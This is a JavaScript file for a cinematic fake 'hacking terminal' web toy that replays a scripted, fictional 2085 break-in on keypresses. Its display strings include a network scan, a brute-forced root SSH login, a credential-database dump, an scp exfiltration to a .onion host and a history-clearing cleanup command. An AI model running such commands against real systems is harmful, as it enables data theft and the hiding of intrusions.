class HackingTerminal {
    constructor() {
        this.terminalContent = document.getElementById('terminal-content');
        this.hiddenInput = document.getElementById('hidden-input');
        this.cursor = document.getElementById('cursor');
        this.currentStep = 0;
        this.isTyping = false;
        this.currentCommand = '';
        this.commandIndex = 0;
        
        this.hackingSequence = [
            {
                command: "whoami",
                output: ["pi3Apple"],
                delay: 100
            },
            {
                command: "uname -a",
                output: [
                    "Linux archlinux 6.7.2-arch1-1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux"
                ],
                delay: 200
            },
            {
                command: "nmap -sS 192.168.1.0/24",
                output: [
                    "Starting Nmap 7.94 ( https://nmap.org )",
                    "Nmap scan report for 192.168.1.1",
                    "Host is up (0.001s latency)",
                    "PORT     STATE SERVICE",
                    "22/tcp   open  ssh",
                    "80/tcp   open  http",
                    "443/tcp  open  https",
                    "",
                    "Nmap scan report for <span class='ip'>192.168.1.157</span>",
                    "Host is up (0.002s latency)",
                    "PORT     STATE SERVICE",
                    "21/tcp   open  ftp",
                    "22/tcp   open  ssh",
                    "2085/tcp open  <span class='success'>chronocore-api</span>",
                    "",
                    "Nmap done: 256 IP addresses scanned"
                ],
                delay: 3000
            },
            {
                command: "ssh root@192.168.1.157",
                output: [
                    "The authenticity of host '192.168.1.157' can't be established.",
                    "ED25519 key fingerprint is SHA256:xK3L9mN2pQ4rS5tU6vW7xY8zA9bC0dE1fG2hI3jK4lM.",
                    "Are you sure you want to continue connecting (yes/no/[fingerprint])? yes",
                    "Warning: Permanently added '192.168.1.157' (ED25519) to the list of known hosts.",
                    "root@192.168.1.157's password: ",
                    "<span class='loading'>Attempting brute force attack</span>",
                    "Access granted.",
                    ""
                ],
                delay: 2500
            },
            {
                command: "ls -la /opt/government/",
                output: [
                    "total 48",
                    "drwxr-xr-x 12 root root  4096 Jan 15 2085 <span class='directory'>.</span>",
                    "drwxr-xr-x  3 root root  4096 Jan 10 2085 <span class='directory'>..</span>",
                    "-rw-------  1 root root  2048 Jan 15 2085 <span class='file'>access.log</span>",
                    "drwx------  2 root root  4096 Jan 15 2085 <span class='directory'>classified</span>",
                    "-rwx------  1 root root  8192 Jan 15 2085 <span class='executable'>chronocore_daemon</span>",
                    "-rw-------  1 root root 16384 Jan 15 2085 <span class='file'>chronocore.db</span>",
                    "drwx------  2 root root  4096 Jan 14 2085 <span class='directory'>encryption_keys</span>",
                    "-rw-------  1 root root  1024 Jan 15 2085 <span class='file'>neural_interface.cfg</span>"
                ],
                delay: 800
            },
            {
                command: "cat /opt/government/access.log | tail -20",
                output: [
                    "[2085-01-15 23:47:12] CHRONOCORE_ACCESS: User admin attempted login",
                    "[2085-01-15 23:47:15] CHRONOCORE_ACCESS: Authentication successful",
                    "[2085-01-15 23:47:16] CHRONOCORE_QUERY: Temporal displacement data requested",
                    "[2085-01-15 23:47:18] CHRONOCORE_QUERY: Timeline manipulation protocols accessed",
                    "[2085-01-15 23:47:20] CHRONOCORE_ALERT: <span class='warning'>Quantum signature anomaly detected</span>",
                    "[2085-01-15 23:47:22] CHRONOCORE_SECURE: Initiating temporal lock protocols",
                    "[2085-01-15 23:47:25] CHRONOCORE_STATUS: Core status: ACTIVE - Timeline: STABLE",
                    "[2085-01-15 23:59:01] CHRONOCORE_BACKUP: Temporal data synchronized",
                    "[2085-01-16 00:00:01] CHRONOCORE_MONITOR: Dimensional barrier integrity: 98.7%"
                ],
                delay: 1200
            },
            {
                command: "ps aux | grep chronocore",
                output: [
                    "root      1337  0.8  2.1 524288 87412 ?        Sl   23:47   0:12 /opt/government/chronocore_daemon --quantum-mode",
                    "root      1338  0.2  0.8 131072 32768 ?        S    23:47   0:03 chronocore_neural_interface",
                    "root      1339  0.1  0.4  65536 16384 ?        S    23:47   0:01 chronocore_temporal_monitor"
                ],
                delay: 600
            },
            {
                command: "netstat -tulpn | grep :2085",
                output: [
                    "tcp        0      0 0.0.0.0:2085            0.0.0.0:*               LISTEN      1337/chronocore_daemon",
                    "tcp6       0      0 :::2085                 :::*                    LISTEN      1337/chronocore_daemon"
                ],
                delay: 400
            },
            {
                command: "curl -X GET http://localhost:2085/api/temporal/status",
                output: [
                    "{",
                    '  "status": "OPERATIONAL",',
                    '  "timeline_integrity": 99.2,',
                    '  "quantum_resonance": "STABLE",',
                    '  "temporal_anchor": "2085-01-16T00:15:23.847Z",',
                    '  "dimensional_locks": 7,',
                    '  "chronocore_version": "v4.7.2-quantum",',
                    '  "access_level": "CLASSIFIED"',
                    "}"
                ],
                delay: 800
            },
            {
                command: "sqlite3 /opt/government/chronocore.db \".tables\"",
                output: [
                    "temporal_events",
                    "quantum_signatures", 
                    "timeline_branches",
                    "dimensional_anchors",
                    "neural_patterns",
                    "access_credentials",
                    "chronocore_config"
                ],
                delay: 600
            },
            {
                command: "sqlite3 /opt/government/chronocore.db \"SELECT * FROM chronocore_config LIMIT 5;\"",
                output: [
                    "1|quantum_entanglement_key|AX7K9M2P4Q6R8S0T1U3V5W7X9Y1Z3A5B|2085-01-01 00:00:00",
                    "2|temporal_displacement_matrix|[[1.0,0.0,0.0],[0.0,1.0,0.0],[0.0,0.0,1.0]]|2085-01-01 00:00:00",
                    "3|neural_interface_protocol|QUANTUM_SYNC_v4.7|2085-01-01 00:00:00",
                    "4|dimensional_barrier_freq|47.832847291847|2085-01-01 00:00:00",
                    "5|<span class='success'>chronocore_master_key</span>|<span class='success'>CH40N0C0R3_M4ST3R_K3Y_2085_QU4NTUM</span>|2085-01-01 00:00:00"
                ],
                delay: 1500
            },
            {
                command: "mkdir -p /tmp/extraction && cd /tmp/extraction",
                output: [],
                delay: 200
            },
            {
                command: "cp /opt/government/chronocore.db ./chronocore_backup.db",
                output: [],
                delay: 800
            },
            {
                command: "tar -czf chronocore_data.tar.gz chronocore_backup.db",
                output: [],
                delay: 600
            },
            {
                command: "base64 chronocore_data.tar.gz | head -10",
                output: [
                    "H4sIAAAAAAAAA+2YbW7bMAyFryLQfm6sH1uSf+xH2AXaFisGtEOx9v53ky7tkqZJm7Zpmma",
                    "NkQSGLfPxPZEvyZfp5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl",
                    "5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl",
                    "CH40N0C0R3_D4T4_3XTR4CT3D_SUCC3SSFULLY_2085_QU4NTUM_T3MP0R4L_M4N1PUL4T10N",
                    "vQmVtVGMxbGE4WWtEY205cmpJUlZQTlByR3hhUmpVVVZEYkdGR0QzQjZNVTB3VGxSSmQxQkJQ",
                    "TEMPORAL_SIGNATURE_AUTHENTICATED_QUANTUM_ENTANGLEMENT_VERIFIED_CHRONOCORE_ACCESS_GRANTED",
                    "5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl",
                    "QU4NTUM_3NCRYPT10N_K3Y_47832847291847_D1M3NS10N4L_B4RR13R_FR3QU3NCY_M4TCH3D",
                    "M4ST3R_4CC3SS_CHR0N0C0R3_D4T4B4S3_C0PY_C0MPL3T3_T3MP0R4L_M4N1PUL4T10N_UNLO",
                    "CK3D_G0V3RNM3NT_S3CUR1TY_BYP4SS3D_SUCC3SSFULLY_2085_ERA_QUANTUM_COMPUTING_PWNED"
                ],
                delay: 2000
            },
            {
                command: "scp chronocore_data.tar.gz pi3Apple@secure-extraction-point.onion:/home/pi3Apple/",
                output: [
                    "chronocore_data.tar.gz                    100%  847KB   2.1MB/s   00:00",
                    "",
                    "<span class='success'>Transfer complete</span>",
                    "",
                    "<span class='ascii-art'>  ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ██╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗",
                    " ██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝",
                    " ██║     ███████║██████╔╝██║   ██║██╔██╗ ██║██║   ██║██║     ██║   ██║██████╔╝█████╗  ",
                    " ██║     ██╔══██║██╔══██╗██║   ██║██║╚██╗██║██║   ██║██║     ██║   ██║██╔══██╗██╔══╝  ",
                    " ╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝╚██████╗╚██████╔╝██║  ██║███████╗",
                    "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝</span>",
                    "",
                    "<span class='success'>DATA EXTRACTION: COMPLETE</span>",
                    "<span class='success'>TIME: 2085-01-16 00:23:47 GMT</span>",
                    "<span class='success'>FILES TRANSFERRED: chronocore.db</span>",
                    "<span class='success'>ENCRYPTION STATUS: BYPASSED</span>",
                    "<span class='success'>ACCESS LEVEL: ROOT</span>",
                    "",
                    "<span class='warning'>WARNING: INTRUSION DETECTION ACTIVE</span>",
                    "<span class='warning'>INITIATING CLEANUP PROTOCOLS...</span>"
                ],
                delay: 3000
            },
            {
                command: "rm -rf /tmp/extraction && history -c && exit",
                output: [
                    "<span class='info'>Clearing traces...</span>",
                    "<span class='info'>Quantum signature scrambled</span>",
                    "<span class='info'>Connection terminated</span>",
                    "<span class='success'>OPERATION COMPLETE - DATA ACQUIRED</span>",
                    "",
                    "Connection to 192.168.1.157 closed."
                ],
                delay: 1500
            }
        ];

        this.init();
    }

    init() {
        // Focus on the hidden input to capture keystrokes
        this.hiddenInput.focus();
        
        // Handle input events
        this.hiddenInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !this.isTyping) {
                this.executeNextCommand();
            } else if (!this.isTyping && e.key.length === 1) {
                this.typeNextCharacter();
            }
        });

        // Keep focus on hidden input
        document.addEventListener('click', () => {
            this.hiddenInput.focus();
        });

        // Handle window focus
        window.addEventListener('focus', () => {
            this.hiddenInput.focus();
        });
    }

    typeNextCharacter() {
        if (this.currentStep >= this.hackingSequence.length) {
            return;
        }

        const step = this.hackingSequence[this.currentStep];
        
        if (this.commandIndex < step.command.length) {
            this.currentCommand += step.command[this.commandIndex];
            this.commandIndex++;
            
            // Update the current line with typed characters
            const currentLine = document.querySelector('.terminal-line:last-child');
            currentLine.innerHTML = `<span class="prompt">[pi3Apple@archlinux ~]$ </span><span class="user-input">${this.currentCommand}</span><span class="cursor" id="cursor">█</span>`;
            this.cursor = document.getElementById('cursor');
        }
    }

    executeNextCommand() {
        if (this.currentStep >= this.hackingSequence.length) {
            return;
        }

        const step = this.hackingSequence[this.currentStep];
        this.isTyping = true;

        // Complete the command if not fully typed
        if (this.commandIndex < step.command.length) {
            this.currentCommand = step.command;
            const currentLine = document.querySelector('.terminal-line:last-child');
            currentLine.innerHTML = `<span class="prompt">[pi3Apple@archlinux ~]$ </span><span class="user-input">${this.currentCommand}</span>`;
        } else {
            // Remove cursor from current line
            const currentLine = document.querySelector('.terminal-line:last-child');
            currentLine.innerHTML = `<span class="prompt">[pi3Apple@archlinux ~]$ </span><span class="user-input">${this.currentCommand}</span>`;
        }

        // Add command output line by line
        setTimeout(() => {
            let outputIndex = 0;
            const addNextLine = () => {
                if (outputIndex < step.output.length) {
                    this.addOutput(`<span class="output">${step.output[outputIndex]}</span>`);
                    outputIndex++;
                    setTimeout(addNextLine, 50);
                } else {
                    // Reset for next command
                    this.currentCommand = '';
                    this.commandIndex = 0;
                    // Add new prompt line
                    this.addNewPromptLine();
                    this.isTyping = false;
                    this.currentStep++;
                }
            };

            setTimeout(addNextLine, 200);
        }, step.delay);
    }



    addOutput(content) {
        const line = document.createElement('div');
        line.className = 'terminal-line';
        line.innerHTML = content;
        this.terminalContent.appendChild(line);
        this.scrollToBottom();
    }

    addNewPromptLine() {
        const line = document.createElement('div');
        line.className = 'terminal-line';
        line.innerHTML = '<span class="prompt">[pi3Apple@archlinux ~]$ </span><span class="cursor" id="cursor">█</span>';
        this.terminalContent.appendChild(line);
        
        // Update cursor reference
        this.cursor = document.getElementById('cursor');
        this.cursor.style.display = 'inline';
        
        this.scrollToBottom();
    }

    scrollToBottom() {
        const terminalBody = document.querySelector('.terminal-body');
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }
}

// Initialize the terminal when the page loads
document.addEventListener('DOMContentLoaded', () => {
    new HackingTerminal();
}); 